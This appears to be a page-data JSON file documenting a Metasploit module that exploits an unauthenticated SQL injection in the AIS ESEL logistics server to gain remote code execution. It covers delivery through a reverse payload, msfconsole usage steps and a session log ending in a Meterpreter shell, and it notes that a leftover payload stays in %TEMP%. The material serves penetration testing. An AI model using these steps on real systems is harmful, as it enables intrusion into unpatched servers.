{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/ais_esel_server_rce","result":{"data":{"moduleMetadataJson":{"id":"ec21c272-7987-5e64-aac6-cf44d3c7b738","name":"AIS logistics ESEL-Server Unauth SQL Injection RCE","fullname":"exploit/windows/misc/ais_esel_server_rce","description":"This module will execute an arbitrary payload on an \"ESEL\" server used by the\n          AIS logistic software. The server typically listens on port 5099 without TLS.\n          There could also be server listening on 5100 with TLS but the port 5099 is\n          usually always open.\n          The login process is vulnerable to an SQL Injection. Usually a MSSQL Server\n          with the 'sa' user is in place.\n\n          This module was verified on version 67 but it should also run on lower versions.\n          An fixed version was created by AIS in September 2017. However most systems\n          have not been updated.\n\n          In regard to the payload, unless there is a closed port in the web server,\n          you dont want to use any \"bind\" payload. You want a \"reverse\" payload,\n          probably to your port 80 or to any other outbound port allowed on the firewall.\n\n          Currently, one delivery method is supported\n\n          This method takes advantage of the Command Stager subsystem. This allows using\n          various techniques, such as using a TFTP server, to send the executable. By default\n          the Command Stager uses 'wcsript.exe' to generate the executable on the target.\n\n          NOTE: This module will leave a payload executable on the target system when the\n          attack is finished.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/ais_esel_server_rce","documentationSlug":"/modules/documentation/exploit/windows/misc/ais_esel_server_rce","referencesSlug":"/modules/references/exploit/windows/misc/ais_esel_server_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">This module will execute an arbitrary payload on an &quot;ESEL&quot; server used by the\nAIS logistic software. The server typically listens on port 5099 without TLS.\nThere could also be server listening on 5100 with TLS but the port 5099 is\nusually always open.\nThe login process is vulnerable to an SQL Injection. Usually a MSSQL Server\nwith the sa user is in place.\n\nThis module was verified on version 67 but it should also run on lower versions.\nAn fixed version was created by AIS in September 2017. However most systems\nhave not been updated.`\n\nIn regard to the payload, unless there is a closed port in the web server,\nyou dont want to use any bind payload. You want a &quot;reverse&quot; payload,\nprobably to your port 80 or to any other outbound port allowed on the firewall.\n\nCurrently, one delivery method is supported\n\nThis method takes advantage of the Command Stager subsystem. This allows using\nvarious techniques, such as using a TFTP server, to send the executable. By default\nthe Command Stager uses &#39;wcsript.exe&#39; to generate the executable on the target.\n\nNOTE: This module will leave a payload executable on the target system when the\nattack is finished.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The application is not publicily available. It was tested on Esel version 67 but should also work an versions below.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/windows/misc/ais_esel_server_rce</code></li>\n<li><code class=\"language-text\">set RHOSTS &lt;IP&gt;</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> \"Server is vulnerable\"</li>\n<li><code class=\"language-text\">run</code></li>\n<li><strong>Verify</strong> Session opened</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/misc/ais_esel_server_rce\nmsf5 exploit(windows/misc/ais_esel_server_rce) &gt; set rhosts 10.66.75.212\nrhosts =&gt; 10.66.75.212\n      msf5 exploit(windows/misc/ais_esel_server_rce) &gt; check\n      [+] 10.66.75.212:5099 - The target is vulnerable.\nmsf5 exploit(windows/misc/ais_esel_server_rce) &gt; run\n\n[*] Started reverse TCP handler on 10.66.75.208:4444\n[+] 10.66.75.212:5099 - Correct response received =&gt; Data send succesfully\n[+] 10.66.75.212:5099 - Correct response received =&gt; Data send succesfully\n[*] 10.66.75.212:5099 - Command Stager progress -   1.47% done (1499/102292 bytes)\n[+] 10.66.75.212:5099 - Correct response received =&gt; Data send succesfully\n[*] 10.66.75.212:5099 - Command Stager progress -   2.93% done (2998/102292 bytes)\n[+] 10.66.75.212:5099 - Correct response received =&gt; Data send succesfully\n      ...\n[*] 10.66.75.212:5099 - Command Stager progress -  99.55% done (101827/102292 bytes)\n[+] 10.66.75.212:5099 - Correct response received =&gt; Data send succesfully\n[*] Sending stage (179779 bytes) to 10.66.75.212\n[*] 10.66.75.212:5099 - Command Stager progress - 100.00% done (102292/102292 bytes)\n[!] 10.66.75.212:5099 - The payload is left on the client in the %TEMP% Folder of the corresponding user.\n[*] 10.66.75.212:5099 - Stager should now be executed. Waiting for 20 seconds..\n[*] Meterpreter session 1 opened (10.66.75.208:4444 -&gt; 10.66.75.212:57107) at 2019-03-27 11:04:29 +0100\n\nmeterpreter &gt; getuid\nServer username: NT Service\\MSSQL$AIS</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ec21c272-7987-5e64-aac6-cf44d3c7b738"}}}